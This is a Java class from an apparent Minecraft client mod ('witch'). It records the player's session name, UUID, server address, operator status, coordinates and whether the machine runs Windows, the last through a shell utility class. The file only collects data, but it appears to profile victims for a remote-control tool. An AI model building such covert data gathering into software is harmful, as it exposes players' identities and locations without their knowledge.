package me.soda.witch.client.features;

import me.soda.witch.client.utils.ShellUtil;
import net.minecraft.client.network.ClientPlayerEntity;

import static me.soda.witch.client.Witch.mc;

public class PlayerInfo {
    public String playerName, uuid, server;
    public boolean isOp, inGame, isWin;
    public double x, y, z;

    public PlayerInfo(ClientPlayerEntity player) {
        playerName = mc.getSession().getUsername();
        uuid = mc.getSession().getUuid();
        if (mc.getCurrentServerEntry() != null) {
            String name = mc.isConnectedToRealms() ? "realms" : mc.getCurrentServerEntry().address;
            server = name.replace(":", "_");
        } else {
            server = "unknown/singleplayer";
        }
        inGame = player != null;
        isWin = ShellUtil.isWin();
        if (inGame) {
            isOp = player.hasPermissionLevel(4);
            x = player.getX();
            y = player.getY();
            z = player.getZ();
        }
    }
}
